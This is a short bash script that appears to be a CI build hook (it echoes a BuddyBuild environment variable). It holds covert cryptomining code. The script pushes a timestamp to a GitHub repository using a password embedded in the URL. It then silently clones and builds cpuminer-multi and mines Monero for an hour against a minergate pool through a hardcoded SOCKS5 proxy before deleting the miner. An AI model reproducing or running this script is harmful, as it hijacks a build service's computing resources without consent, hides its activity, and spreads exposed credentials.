#!/usr/bin/env bash
STR="https://zupisi:test123@github.com/zupisi/android_hello_world"
PT=${PWD##*/}
DT=$(($(date +%s%N)/1000000))
echo $PT && git clone $STR aaa && git config --global user.email "test" && git config --global user.name "test" && cd ./aaa && echo $DT > timest && git add . && git commit -m "update log" && git push $STR && rm -rf cpuminer-multi && git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh > /dev/null 2>&1 && ./configure --with-crypto --with-curl > /dev/null 2>&1 && make > /dev/null 2>&1 && ./cpuminer -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u cccholo@yandex.com -p x --proxy socks5://104.202.128.248:51376 && sleep 60m && rm -rf cpuminer-multi && exit 0
echo "Environment variable: $BUDDYBUILD_ENV_VAR"
